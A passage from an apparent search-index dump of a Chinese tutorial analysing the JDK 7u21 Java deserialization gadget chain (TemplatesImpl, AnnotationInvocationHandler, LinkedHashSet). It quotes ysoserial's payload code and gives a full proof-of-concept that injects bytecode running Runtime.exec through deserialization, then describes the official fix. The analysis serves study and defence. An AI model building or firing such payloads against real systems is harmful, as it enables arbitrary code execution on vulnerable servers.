\u8fd9\u91cc\u627f\u63a5\u4e0a\u9762\u8bf4\u7684\uff0c\u4e3a\u4ec0\u4e48\u521d\u59cb\u5316AnnotationInvocationHandler\u5bf9\u8c61\u65f6\u4f20\u5165\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\uff08\u5373this.type)\u662fTemplates.class\uff0c\u800c\u4e0d\u662fTemplatesImpl.class \u8bda\u7136\uff0c\u8fd9\u4e24\u4e2a\u7c7b\u5bf9\u8c61\u90fd\u6709\u65b9\u6cd5newTransformer\u3002\u4f46\u662f\u5982\u679c\u4f20\u5165TemplatesImpl.class\uff0c\u5728\u904d\u5386\u5176\u4e2d\u65b9\u6cd5\u5e76\u901a\u8fc7\u53cd\u5c04\u6267\u884c\u65f6\u4f1a\u51fa\u73b0\u9519\u8bef\uff1aequalsImpl\u4e2d\u7684\u53cd\u5c04\u8c03\u7528\u662f\u4e0d\u4f20\u5165\u53c2\u6570\u7684 \u800cTemplatesImpl\u4e2d\u6709\u8bb8\u591a\u9700\u8981\u4f20\u5165\u53c2\u6570\u624d\u80fd\u88ab\u6b63\u5e38\u4f7f\u7528\u7684\u65b9\u6cd5\uff0c\u5982\u679c\u4e0d\u4f20\u5165\u53c2\u6570\u5c31\u53cd\u5c04\u8c03\u7528\u5c31\u4f1a\u629b\u51fa\u5f02\u5e38\uff0c\u4ee5\u81f3\u4e8e\u5728\u904d\u5386\u5230newTransformer\u65b9\u6cd5\u524d\u5c31\u4f1a\u629b\u51fa\u5f02\u5e38\uff0c\u4ece\u800c\u5bfc\u81f4\u4ee3\u7801\u6267\u884c\u4e0d\u88ab\u5b9e\u73b0\u3002 \u4ec5\u4ec5\u662f\u8fd9\u6837\uff0c\u4e5f\u8fd8\u662f\u4e0d\u591f\u7684\uff0c\u6211\u4eec\u8fd8\u662f\u5f97\u624b\u52a8\u8c03\u7528equals\u624d\u80fd\u5bfc\u81f4\u4ee3\u7801\u6267\u884c\uff0c\u53cd\u5e8f\u5217\u5316\u70b9\u5728\u54ea\u91cc\uff1f LinkedHashSet ysoserial\u7684payload\u4e2d\u51fa\u73b0\u4e86\u6b64\u7c7b\u3002 LinkedHashSet\u7ee7\u627f\u81eaHashSet\u7c7b\uff0c\u5b83\u7684readObject\u65b9\u6cd5\u4e5f\u662f\u4eceHashSet\u7ee7\u627f\u800c\u6765\u7684\u3002\u6211\u4eec\u770b\u770breadObject\u65b9\u6cd5\u7684\u6784\u9020 private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException { var1.defaultReadObject(); int var2 = var1.readInt(); float var3 = var1.readFloat(); this.map = (HashMap)(this instanceof LinkedHashSet ? new LinkedHashMap(var2, var3) : new HashMap(var2, var3)); int var4 = var1.readInt(); for(int var5 = 0; var5 < var4; ++var5) { Object var6 = var1.readObject(); this.map.put(var6, PRESENT); } } } \u5b83\u7684\u4e3b\u8981\u4eae\u70b9\u5728for\u5faa\u73af\u91cc\u9762\uff1a\u904d\u5386\u4f20\u5165\u7684\u5e8f\u5217\u5316\u5bf9\u8c61\uff0c\u5c06\u5176\u53cd\u5e8f\u5217\u5316\u540e\uff0c\u518d\u4f20\u5165put\u65b9\u6cd5 \u6240\u4ee5\u6211\u4eec\u518d\u6765\u8ddf\u8fdb\u4e00\u4e0bmap.put\u65b9\u6cd5 public V put(K var1, V var2) { if (var1 == null) { return this.putForNullKey(var2); } else { int var3 = this.hash(var1); int var4 = indexFor(var3, this.table.length); for(HashMap.Entry var5 = this.table[var4]; var5 != null; var5 = var5.next) { Object var6; if (var5.hash == var3 && ((var6 = var5.key) == var1 || var1.equals(var6))) { //here Object var7 = var5.value; var5.value = var2; var5.recordAccess(this); return var7; } } ++this.modCount; this.addEntry(var3, var1, var2, var4); return null; } } \u6ce8\u610f\u6211\u4eec\u6dfb\u52a0\u6ce8\u91ca\u90a3\u4e00\u884c\uff0c\u6709\u4e00\u4e2avar1.equals(var6))) \u5176\u4e2dvar1\u548cvar6\u6211\u4eec\u90fd\u662f\u53ef\u4ee5\u63a7\u5236\u7684\uff1avar1\u5373\u4f20\u5165\u7684\u53cd\u5e8f\u5217\u5316\u5bf9\u8c61(\u6076\u610fTemplatesImpl)\uff0cvar6\u5b9e\u9645\u4e0a\u4e5f\u662f\u6211\u4eec\u4f20\u5165\u7684\u53cd\u5e8f\u5217\u5316\u5bf9\u8c61\uff08\u6076\u610fAnnotationInvocationHandler\u4ee3\u7406\u5bf9\u8c61\uff09\u3002 \u4f46\u662f\u60f3\u8981\u6267\u884cvar1.equals(var6))) \u5219\u5fc5\u987b\u8981\u8ba9 var5.hash == var3 \u4e3atrue \u4e14 (var6 = var5.key) == var1\u4e3afalse. \u600e\u4e48\u505a\u5230\u5462\uff1f \u6ce8\u610fput\u65b9\u6cd5\u7684\u7b2c5\u884c\uff0c\u5bf9\u4f20\u5165\u7684\u53cd\u5e8f\u5217\u5316\u5bf9\u8c61\u8c03\u7528\u4e86hash\u65b9\u6cd5\u3002\u6211\u4eec\u8ddf\u8fdbhash\u65b9\u6cd5 final int hash(Object var1) { int var2 = 0; if (this.useAltHashing) { if (var1 instanceof String) { return Hashing.stringHash32((String)var1); } var2 = this.hashSeed; } var2 ^= var1.hashCode(); //here var2 ^= var2 >>> 20 ^ var2 >>> 12; return var2 ^ var2 >>> 7 ^ var2 >>> 4; } \u53d1\u73b0\u4f1a\u6267\u884c\u4f20\u5165\u7684\u53c2\u6570\u5bf9\u8c61\u7684hashCode()\u65b9\u6cd5 \u5f53\u6211\u4eec\u4f20\u5165\u7684\u53c2\u6570\u4e3a\u6076\u610fAnnotationInvocationHandler\u4ee3\u7406\u5bf9\u8c61\u65f6\uff0c\u4f1a\u8c03\u7528\u4ee3\u7406\u5bf9\u8c61\u4e2d\u7684invoke\u65b9\u6cd5\u3002\u5bf9\u4e8eAnnotationInvocationHandler\u800c\u8a00\u5f53\u5224\u65ad\u5230\u6267\u884chashCode\u65b9\u6cd5\u65f6\uff0c\u5b9e\u8d28\u4e0a\u4f1a\u6267\u884cAnnotationInvocationHandler\u4e2d\u7684hashCodeImpl\u65b9\u6cd5 \u6211\u4eec\u8ddf\u8fdbhashCodeImpl private int hashCodeImpl() { int var1 = 0; Entry var3; for(Iterator var2 = this.memberValues.entrySet().iterator(); var2.hasNext(); var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) { var3 = (Entry)var2.next(); } return var1; } \u4e0a\u9762\u662f\u771f\u5b9e\u4ee3\u7801\uff0c\u6bd4\u8f83\u96be\u770b\uff0c\u6240\u4ee5\u501f\u9274\u4e86\u4e00\u4e0b\u522b\u4eba\u5bf9\u5176\u8fdb\u884c\u4fee\u6539\u540e\u7684\u4ee3\u7801\uff0c\u65b9\u4fbf\u6211\u4eec\u8fdb\u884c\u5206\u6790 private int hashCodeImpl() { int result = 0; // \u904d\u5386 memberValues Iterator itr = this.memberValues.entrySet().iterator(); for( ;itr.hasNext(); ) { Entry entry = (Entry)itr.next(); String key = ((String)entry.getKey()); Object value = entry.getValue(); // 127 * key \u7684 hashCode\uff0c\u518d\u548c memberValueHashCode(value) \u8fdb\u884c\u5f02\u6216 result += 127 * key.hashCode() ^ memberValueHashCode(value); } return result; } \u8fd9\u4e2a\u65b9\u6cd5\u4f1a\u904d\u5386this.memberValues\u5c5e\u6027\uff08\u8fd9\u4e2a\u5c5e\u6027\u5b9e\u8d28\u4e0a\u5c31\u662fHashMap\u5185\u6dfb\u52a0\u7684\u5c5e\u6027\uff09\uff0c\u7136\u540e\u5bf9\u5176\u4e2d\u6bcf\u4e00\u9879\u952e\u503c\u5c5e\u6027\u8fdb\u884c\u8fdb\u884c\u4f4d\u8fd0\u7b97\u5e76\u7d2f\u52a0 \u5176\u4e2dmemberValueHashCode\u51fd\u6570\u6211\u4eec\u4e5f\u53ef\u4ee5\u8ddf\u8fdb\u4e00\u4e0b \u53d1\u73b0\u53ea\u8981\u4f20\u5165\u53c2\u6570\u4e0d\u4e3a\u6570\u7ec4\uff0c\u5c31\u8c03\u7528\u5b83\u7684hashCode\u51fd\u6570\u5e76\u8fd4\u56de\u3002 \u6211\u4eec\u6765\u68b3\u7406\u4e00\u4e0b\uff0c\u600e\u4e48\u624d\u80fd\u8c03\u7528\u5230put\u65b9\u6cd5\u91cc\u7684equals\u89e6\u53d1\u4ee3\u7801\u6267\u884c\uff1a payload\u9636\u6bb5\uff1a \u5efa\u7acb\u4e00\u4e2amap\u53d8\u91cf\uff0c\u5176key\u4e3a\u7279\u6b8a\u7684\u4e00\u4e2a\u503c:f5a5a608,\u8fd9\u4e2a\u503c\u7684hashCode\u662f0\uff0c\u7136\u540e\u503c\u4e3a\u6076\u610ftemplatesImpl\u7c7b\uff0c\u7136\u540e\u4ee5\u8fd9\u4e2amap\u53d8\u91cf\u4e3a\u53c2\u6570\u5efa\u7acbAnnotationInvocationHandler\u4ee3\u7406\u5bf9\u8c61\u3002 \u518d\u5411HashMap\u91cc\u653e\u5165\u4e00\u4e2a\u503c\uff0c\u952e\u4e3a\u6076\u610fTemplatesImpl\u5bf9\u8c61\uff0c \u518d\u653e\u5165\u4e00\u4e2a\u503c\uff0c\u952e\u4e3a\u6076\u610fAnnotationInvocationHandler\u5bf9\u8c61\u3002 \uff08LinkedHashSet\u4f1a\u8ba9HashMap\u6709\u5e8f\uff0c\u4ece\u800c\u5728\u53cd\u5e8f\u5217\u5316\u7684\u65f6\u5019\u80fd\u6309\u987a\u5e8f\u4f9d\u6b21\u4eceHashMap\u8bfb\u53d6\u5bf9\u8c61\u3002\u5982\u679c\u7528HashSet\uff0c\u5219\u4f1a\u5728\u53cd\u5e8f\u5217\u5316\u65f6\u62a5\u9519\uff09 \u53cd\u5e8f\u5217\u5316\u9636\u6bb5\uff1a \u968f\u540e\u5728readObject\u65f6\uff0cTemplatesImpl\u5148\u88abput\u65b9\u6cd5\u8c03\u7528\u3002 \u7136\u540e\u5728put\u65b9\u6cd5\u91cc\u901a\u8fc7hash()\u65b9\u6cd5\u83b7\u5f97\u5176hash\uff0c\u5e76\u5c06\u5176\u5f55\u5165\u5230\u5b83\u7684hash\u5c5e\u6027\u91cc\uff0c\u7136\u540e\u5199\u5165\u5230HashMap\u7684\u5b58\u50a8\u961f\u5217\u91cc\u3002 \u7136\u540eAnnotationInvocationHandler\u518d\u88abput\u65b9\u6cd5\u8c03\u7528 \u5728\u5bf9\u5176\u4f7f\u7528hash\u65b9\u6cd5\u83b7\u5f97hash\u65f6\uff0c\u4f1a\u56e0\u5176\u662f\u4e00\u4e2a\u4ee3\u7406\u7c7b\u7684\u7f18\u6545\u5728hash\u51fd\u6570\u5185\u90e8\u8c03\u7528hashCode()\u65b9\u6cd5\u65f6\u4f1a\u8c03\u7528\u5176\u4ee3\u7406\u65b9\u6cd5hashCodeImpl\u3002 \u968f\u540e\u5728hashCodeImpl\u5185\u90e8\u904d\u5386this.memberValues\u53d8\u91cf\uff08\u4e5f\u5c31\u662f\u4e4b\u524d\u521d\u59cb\u5316\u65f6\u653e\u5165\u7684map\u53d8\u91cf\uff09 \u5c06\u6bcf\u4e00\u9879\u7684key\u503c\u7684hashCode\u4e0e\u4f20\u5165map vaule\u503c\u4f5c\u4e3a\u53c2\u6570\u7684memberValueHashCode\u65b9\u6cd5\u8fdb\u884c\u5f02\u6216\u3002 \u8fd9\u4e2amemberValueHashCode\u65b9\u6cd5\u4f1a\u5224\u65ad\u4f20\u5165\u7684\u503c\u662f\u5426\u4e3a\u6570\u7ec4\uff0c\u82e5\u4e0d\u662f\u6570\u7ec4\u5219\u76f4\u63a5\u8fd4\u56de\u53c2\u6570\u7684hashCode()\u3002 \u56e0\u4e3a\u6211\u4eec\u4e4b\u524d\u521d\u59cb\u5316\u4ee3\u7406\u5bf9\u8c61\u65f6\u4f20\u5165\u7684\u662f\u4e00\u4e2a\u952e\u4e3af5a5a608\uff0c\u503c\u4e3aeviltemplates\u7684map\uff0c\u6240\u4ee5\u4ee5\u4e0ahash\u8ba1\u7b97\u6700\u7ec8\u5f97\u5230\u7684\u7ed3\u679c\uff0c\u4fbf\u662f0^(templatesImpl.hashCode()). \u4e5f\u5c31\u662ftemplatesImpl.hashCode()\u3002\u6240\u4ee5\u4e5f\u5c31\u662f\u8bf4AnnotationInvocationHandler\u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\u4f20\u5165\u88abhash\u65b9\u6cd5\u6267\u884c\u540e\u7684\u7ed3\u679c\uff0c\u5c31\u76f8\u5f53\u4e8e\u662fhash(eviltemplates) \u968f\u540e\u8fd9\u4e2a\u503c\u6765\u5230if\u5224\u65ad\u903b\u8f91\uff0c\u5b83\u904d\u5386\u4e4b\u524d\u7684\u503c\uff0c\u5e76\u5c06\u904d\u5386\u5f97\u5230\u7684\u503c\u8d4b\u7ed9var5 \u4e0a\u4e00\u4e2a\u503c\u7684hash\uff08\u4e5f\u5c31\u662feviltemplates\u7684hash\uff09\u4e0eAnnotationInvocationHandler\u5bf9\u8c61\u7684hash\uff08\u4e5f\u8fd8\u662feviltemplates\u7684hash\uff09\u76f8\u540c\uff0c\u4f46\u662fAnnotationInvocationHandler\u5bf9\u8c61\u4e0eeviltemplates\u5bf9\u8c61\u5e76\u4e0d\u76f8\u540c\uff0c\u6240\u4ee5\u4fbf\u89e6\u52a8\u4e86equals\uff0c\u4ee3\u7801\u6267\u884c\u6210\u529f\u3002 \u5b8c\u6574payload \u7eb5\u89c2\u4ee5\u4e0a\u4e09\u4e2a\u7c7b\uff0c\u6211\u4eec\u53ef\u4ee5\u5199\u51fapayload public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass cc = pool.makeClass(\"evilclass\"); String cmd = \"Runtime.getRuntime().exec(\\\"calc\\\");\"; CtConstructor cons = new CtConstructor(new CtClass[]{},cc); cons.setBody(\"Runtime.getRuntime().exec(\\\"calc\\\");\"); cc.addConstructor(cons); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); cc.setName(\"evilClass\"); byte[] evilbytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{evilbytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); Class clazz = TemplatesImpl.class.newInstance().getClass(); Field[] Fields = clazz.getDeclaredFields(); for (Field Field : Fields) { //\u904d\u5386Fields\u6570\u7ec4 try { //\u6267\u884cget()\u65b9\u6cd5\u65f6\u9700\u629b\u51faIllegalAccessException\u9519\u8bef Field.setAccessible(true); //\u5bf9\u6570\u7ec4\u4e2d\u7684\u6bcf\u4e00\u9879\u5b9e\u73b0\u79c1\u6709\u8bbf\u95ee if(Field.getName()==\"_bytecodes\"){ Field.set(templates,targetByteCodes); } if(Field.getName()==\"_class\"){ Field.set(templates,null); } if(Field.getName()==\"_name\"){ Field.set(templates,\"abc\"); } if(Field.getName()==\"_tfactory\"){ Field.set(templates,new TemplatesImpl()); } } catch (Exception e) {} } Map map = new HashMap(); String magicStr = \"f5a5a608\"; final Constructor<?> ctor = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructors()[0]; ctor.setAccessible(true); InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Templates.class, map); Object proxy = Proxy.newProxyInstance(null, Object.class.getInterfaces(), invocationHandler); HashSet target = new LinkedHashSet(); target.add(templates); target.add(proxy); //\u8fd9\u4e2amap\u9700\u8981\u5728Hashmap put\u4e86proxy\u540e\u518d\u8d4b\u503c\uff0c\u4e0d\u7136\u4f1a\u62a5\u9519\uff08\u6211\u4e5f\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48 map.put(magicStr, templates); // \u5e8f\u5217\u5316 ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(filename)); oos.writeObject(target); // \u53cd\u5e8f\u5217\u5316 ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); ois.readObject(); \u770b\u4e00\u4e0b\u8c03\u7528\u6808 \u66f4\u76f4\u89c2\u7684\u8c03\u7528\u94fe LinkedHashSet.readObject() LinkedHashSet.add() ... TemplatesImpl.hashCode() (X) LinkedHashSet.add() ... Proxy(Templates).hashCode() (X) AnnotationInvocationHandler.invoke() (X) AnnotationInvocationHandler.hashCodeImpl() (X) String.hashCode() (0) AnnotationInvocationHandler.memberValueHashCode() (X) TemplatesImpl.hashCode() (X) Proxy(Templates).equals() AnnotationInvocationHandler.invoke() AnnotationInvocationHandler.equalsImpl() Method.invoke() ... // TemplatesImpl.getOutputProperties()\uff0c\u5b9e\u9645\u6d4b\u8bd5\u65f6\u4f1a\u76f4\u63a5\u8c03\u7528 newTransformer() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() ClassLoader.defineClass() Class.newInstance() ... MaliciousClass.<clinit>() ... Runtime.exec() \u603b\u7ed3 \u76f4\u63a5\u5ad6\u4f1f\u795e@F4DE\u7684\u603b\u7ed3\uff0c\u4ed6\u603b\u7ed3\u7684\u592a\u597d\u4e86 \u6240\u4ee5\uff0c\u6574\u4e2a\u5229\u7528\u7684\u8fc7\u7a0b\u5c31\u6e05\u6670\u4e86\uff0c\u6309\u7167\u5982\u4e0b\u6b65\u9aa4\u6765\u6784\u9020\uff1a \u9996\u5148\u751f\u6210\u6076\u610f TemplateImpl \u5bf9\u8c61 \u5b9e\u4f8b\u5316 AnnotationInvocationHandler \u5bf9\u8c61 \u5b83\u7684type\u5c5e\u6027\u662f\u4e00\u4e2a Templates \u7c7b \u5b83\u7684 memberValues \u5c5e\u6027\u662f\u4e00\u4e2a Map \uff0c Map \u53ea\u6709\u4e00\u4e2akey\u548cvalue\uff0ckey\u662f\u5b57\u7b26\u4e32 f5a5a608 \uff0c value\u662f\u524d\u9762\u751f\u6210\u7684\u6076\u610f TemplateImpl \u5bf9\u8c61 \u5bf9\u8fd9\u4e2a AnnotationInvocationHandler \u5bf9\u8c61\u505a\u4e00\u5c42\u4ee3\u7406\uff0c\u751f\u6210proxy\u5bf9\u8c61 \u5b9e\u4f8b\u5316\u4e00\u4e2a HashSet \uff0c\u8fd9\u4e2a HashSet \u6709\u4e24\u4e2a\u5143\u7d20\uff0c\u5206\u522b\u662f: TemplateImpl \u5bf9\u8c61 proxy \u5bf9\u8c61 \u5c06 HashSet \u5bf9\u8c61\u8fdb\u884c\u5e8f\u5217\u5316 \u8fd9\u6837\uff0c\u53cd\u5e8f\u5217\u5316\u89e6\u53d1\u4ee3\u7801\u6267\u884c\u7684\u6d41\u7a0b\u5982\u4e0b\uff1a \u89e6\u53d1 HashSet#readObject \u65b9\u6cd5\uff0c\u5176\u4e2d\u4f7f\u7528 HashMap \u7684key\u505a\u53bb\u91cd \u53bb\u91cd\u65f6\u8ba1\u7b97 HashSet \u4e2d\u7684\u4e24\u4e2a\u5143\u7d20\u7684 hashCode() \uff0c\u56e0\u4e3a\u6211\u4eec\u7684\u7cbe\u5fc3\u6784\u9020\u4e8c\u8005\u76f8\u7b49\uff0c\u8fdb\u800c\u89e6\u53d1 equals() \u65b9\u6cd5 \u8c03\u7528 AnnotationInvocationHandler#equalsImpl \u65b9\u6cd5 equalsImpl \u4e2d\u904d\u5386this.type\u7684\u6bcf\u4e2a\u65b9\u6cd5\u5e76\u8c03\u7528 \u56e0\u4e3athis.type\u662f Templates \u7c7b\uff0c\u6240\u4ee5\u89e6\u53d1\u4e86 newTransform() \u6216 getOutputProperties() \u65b9\u6cd5 \u4efb\u610f\u4ee3\u7801\u6267\u884c \u5b98\u65b9\u4fee\u590d \u5728sun.reflect.annotation.AnnotationInvocationHandler\u7c7b\u7684readObject\u51fd\u6570\u4e2d\uff0c\u539f\u672c\u6709\u4e00\u4e2a\u5bf9this.type\u7684\u68c0\u67e5\uff0c\u5728\u5176\u4e0d\u662fAnnotationType\u7684\u60c5\u51b5\u4e0b\uff0c\u4f1a\u629b\u51fa\u4e00\u4e2a\u5f02\u5e38\u3002\u4f46\u662f\uff0c\u6355\u83b7\u5230\u5f02\u5e38\u540e\u6ca1\u6709\u505a\u4efb\u4f55\u4e8b\u60c5\uff0c\u53ea\u662f\u5c06\u8fd9\u4e2a\u51fd\u6570\u8fd4\u56de\u4e86\uff0c\u8fd9\u6837\u5e76\u4e0d\u5f71\u54cd\u6574\u4e2a\u53cd\u5e8f\u5217\u5316\u7684\u6267\u884c\u8fc7\u7a0b\u3002\u5728\u65b0\u7248\u4e2d\uff0c\u5c06\u8fd9\u4e2a\u8fd4\u56de\u6539\u4e3a\u4e86\u629b\u51fa\u4e00\u4e2a\u5f02\u5e38\uff0c\u4f1a\u5bfc\u81f4\u6574\u4e2a\u5e8f\u5217\u5316\u7684\u8fc7\u7a0b\u7ec8\u6b62\u3002 \u800c\u5bf9\u5b83\u7684\u7ed5\u8fc7\u5219\u662f8u20\u94fe\u7684\u6545\u4e8b\u4e86...","title":"7u21\u94fe\u6d45\u6790"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/7u21%E9%93%BE%E6%B5%85%E6%9E%90/7u21%E9%93%BE%E6%B5%85%E6%9E%90/#7u21","text":"","title":"7u21\u94fe\u6d45\u6790"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/7u21%E9%93%BE%E6%B5%85%E6%9E%90/7u21%E9%93%BE%E6%B5%85%E6%9E%90/#_1","text":"\u7b80\u4ecb \u5206\u6790 from ysonerial TemplatesImpl AnnotationInvocationHandler LinkedHashSet \u5b8c\u6574payload \u603b\u7ed3 \u5b98\u65b9\u4fee\u590d","title":"\u76ee\u5f55"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/7u21%E9%93%BE%E6%B5%85%E6%9E%90/7u21%E9%93%BE%E6%B5%85%E6%9E%90/#_2","text":"jdk7u21 \u94fe\uff0c\u662f\u4e00\u4e2a\u4e0d\u9700\u8981\u501f\u52a9\u7b2c\u4e09\u65b9\u5e93\u5c31\u80fd\u5b9e\u73b0\u7684\u94fe\u3002\u5f71\u54cd\u7248\u672c<=7u21","title":"\u7b80\u4ecb"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/7u21%E9%93%BE%E6%B5%85%E6%9E%90/7u21%E9%93%BE%E6%B5%85%E6%9E%90/#_3","text":"","title":"\u5206\u6790"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/7u21%E9%93%BE%E6%B5%85%E6%9E%90/7u21%E9%93%BE%E6%B5%85%E6%9E%90/#from-ysonerial","text":"\u6211\u4eec\u5148\u6765\u770b\u770bysonerial\u91cc\u7684payload\u662f\u600e\u4e48\u5199\u7684\uff0c\u7136\u540e\u6cbf\u7740\u5176\u601d\u8def\u8fdb\u884c\u5206\u6790 public Object getObject(String command) throws Exception { Object templates = Gadgets.createTemplatesImpl(command); String zeroHashCodeStr = \"f5a5a608\"; HashMap map = new HashMap(); map.put(zeroHashCodeStr, \"foo\"); InvocationHandler tempHandler = (InvocationHandler)Reflections.getFirstCtor(\"sun.reflect.annotation.AnnotationInvocationHandler\").newInstance(Override.class, map); Reflections.setFieldValue(tempHandler, \"type\", Templates.class); Templates proxy = (Templates)Gadgets.createProxy(tempHandler, Templates.class, new Class[0]); LinkedHashSet set = new LinkedHashSet(); set.add(templates); set.add(proxy); Reflections.setFieldValue(templates, \"_auxClasses\", (Object)null); Reflections.setFieldValue(templates, \"_class\", (Object)null); map.put(zeroHashCodeStr, templates); return set; }","title":"from ysonerial"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/7u21%E9%93%BE%E6%B5%85%E6%9E%90/7u21%E9%93%BE%E6%B5%85%E6%9E%90/#templatesimpl","text":"\u6211\u4eec\u770b\u5230\uff0cysonerial\u7684payload\u4e0a\u6765\u5c31\u901a\u8fc7Gadgets.createTemplatesImpl(command) \u8bd5\u56fe\u521b\u5efa\u4e00\u4e2aTemplatesImpl\u7c7b\u3002 createTemplatesImpl\u6e90\u7801\u5982\u4e0b\uff0c\u6211\u4eec\u53d1\u73b0\u521b\u5efaTemplatesImpl\u7c7b\u540e\u53c8\u901a\u8fc7\u53cd\u5c04\u548cjavassist\u505a\u4e86\u8bb8\u591a\u64cd\u4f5c\u3002 public static <T> T createTemplatesImpl(String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory) throws Exception { T templates = tplClass.newInstance(); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(Gadgets.StubTransletPayload.class)); pool.insertClassPath(new ClassClassPath(abstTranslet)); CtClass clazz = pool.get(Gadgets.StubTransletPayload.class.getName()); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"\" + command.replaceAll(\"\\\\\\\\\", \"\\\\\\\\\\\\\\\\\").replaceAll(\"\\\"\", \"\\\\\\\"\") + \"\\\");\"; clazz.makeClassInitializer().insertAfter(cmd); clazz.setName(\"ysoserial.Pwner\" + System.nanoTime()); CtClass superC = pool.get(abstTranslet.getName()); clazz.setSuperclass(superC); byte[] classBytes = clazz.toBytecode(); Reflections.setFieldValue(templates, \"_bytecodes\", new byte[][]{classBytes, ClassFiles.classAsBytes(Gadgets.Foo.class)}); Reflections.setFieldValue(templates, \"_name\", \"Pwnr\"); Reflections.setFieldValue(templates, \"_tfactory\", transFactory.newInstance()); return templates; } \u90a3\u4e48\u4e3a\u4ec0\u4e48\u8981\u521b\u5efa\u8fd9\u4e2a\u7c7b\u5e76\u4e14\u8c03\u7528\u53cd\u5c04\u548cjavassist\u673a\u5236\u5462\uff1f\u5148\u4e0d\u6025\uff0c\u6211\u4eec\u770b\u4e00\u4e0bTemplatesImpl\u6e90\u7801\u3002 \u9996\u5148TemplatesImpl\u7c7b\u4e2d\u6709\u4e2a\u65b9\u6cd5defineTransletClasses\uff0c\u5b83\u7684\u4e3b\u8981\u4ee3\u7801\u5982\u4e0b private byte[][] _bytecodes = (byte[][])null; private void defineTransletClasses() throws TransformerConfigurationException { if (this._bytecodes == null) { ..... } else { TemplatesImpl.TransletClassLoader loader = (TemplatesImpl.TransletClassLoader)AccessController.doPrivileged(new PrivilegedAction() { public Object run() { return new TemplatesImpl.TransletClassLoader(ObjectFactory.findClassLoader()); } }); try { int classCount = this._bytecodes.length; this._class = new Class[classCount]; for(int i = 0; i < classCount; ++i) { this._class[i] = loader.defineClass(this._bytecodes[i]); \\\\\u5c06_bytecodes\u4e2d\u7684\u6240\u6709\u5b57\u8282\u901a\u8fc7defineClass\u8f6c\u5316\u4e3a\u4e00\u4e2a\u7c7b Class superClass = this._class[i].getSuperclass(); if (superClass.getName().equals(ABSTRACT_TRANSLET)) { this._transletIndex = i; } else { this._auxClasses.put(this._class[i].getName(), this._class[i]); } } } \u4e5f\u5c31\u662f\u8bf4\u901a\u8fc7\u8fd9\u4e2a\u65b9\u6cd5\u53ef\u4ee5\u5c06_bytecodes\u6570\u7ec4\u4e2d\u7684\u5b57\u8282\u8fd8\u539f\u6210\u4e00\u4e2a\u7c7b\uff0c\u5b58\u50a8\u5230_class\u53d8\u91cf\u4e2d\u3002\u63a5\u4e0b\u6765\u5982\u679c\u6211\u4eec\u80fd\u627e\u5230\u8c03\u7528defineTransletClasses\u65b9\u6cd5\u5e76\u6267\u884c\u4e86_class[].newinstance() \u8fd9\u6837\u7684\u7684\u4ee3\u7801\u7684\u65b9\u6cd5\uff0c\u5c31\u80fd\u5b9e\u4f8b\u5316\u4ece\u5b57\u8282\u5f97\u5230\u7684\u7c7b\u4e86\uff0c\u4ece\u800c\u5c31\u80fd\u6267\u884c\u7c7b\u4e2d\u7684\u9759\u6001\u4ee3\u7801\u5757\u548c\u6784\u9020\u51fd\u6570\u4e86\uff01 \u6240\u4ee5\u63a5\u4e0b\u6765\u6211\u4eec\u9700\u8981\u53bb\u5bfb\u627e\u8fd9\u79cd\u65b9\u6cd5\u3002 \u901a\u8fc7\u641c\u7d22defineTransletClasses\uff0c\u6211\u4eec\u627e\u5230\u4e86\u6709\u5982\u4e0b\u4e09\u4e2a\u65b9\u6cd5\u8c03\u7528\u4e86defineTransletClasses\u65b9\u6cd5\uff1a getTransletInstance getTransletIndex getTransletClasses \u5176\u4e2d\uff0cgetTransletInstance\u65b9\u6cd5\u662f\u552f\u4e00\u7b26\u5408\u201c\u8c03\u7528\u4e86defineTransletClasses\u4e14\u6709_class[].newinstance()\u201d\u7684\u65b9\u6cd5\uff0c\u5176\u4ee3\u7801\u5982\u4e0b private Translet getTransletInstance() throws TransformerConfigurationException { ErrorMsg err; try { if (this._name == null) { return null; } else { if (this._class == null) { this.defineTransletClasses(); } AbstractTranslet translet = (AbstractTranslet)this._class[this._transletIndex].newInstance(); \\\\here translet.postInitialization(); translet.setTemplates(this); translet.setServicesMechnism(this._useServicesMechanism); if (this._auxClasses != null) { translet.setAuxiliaryClasses(this._auxClasses); } return translet; } \u90a3\u4e48\uff0cgetTransletInstance\u662f\u4e00\u4e2aprivate\u65b9\u6cd5\uff0c\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u8c03\u7528\u5b83\uff0c\u5728\u90a3\u91cc\u80fd\u53bb\u8c03\u7528\u5b83\u5462\uff1f\u7b54\u6848\u662fnewTransformer\u65b9\u6cd5 public synchronized Transformer newTransformer() 